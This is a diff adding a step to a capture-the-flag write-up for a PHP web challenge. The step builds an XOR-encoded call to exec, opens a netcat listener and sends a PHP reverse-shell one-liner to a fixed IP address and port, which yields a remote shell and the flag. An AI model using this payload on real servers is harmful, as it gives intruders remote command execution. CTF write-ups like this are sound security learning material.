@@ -30,6 +30,16 @@
 
 > The function we want to execute, that has exactly four letters, is the `exec` function, so the value of `_GET[87]` should be `"exec" ^ "d00r"`. We compute this value and convert into url notation `'%01HU%11'`. For `_POST[#]` we can use reverse shell to rebound the server shell onto our local nc listener.
 
+> On my local machine, I opened a netcat listener on port 1234 with
+```sh
+nc -vl 140.112.150.194 1234
+```
+> On burpsuite, I modified the payload with `'%01HU%11'` for `get` and  for `post`:
+```sh
+php -r '$sock=fsockopen("140.112.150.194",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+> That got me a shell on the remote server! I dug into the directories and found a file named `flag_is_here`. That's our flag!
+
 
 ### Problem 3: m4chine (reverse)
 
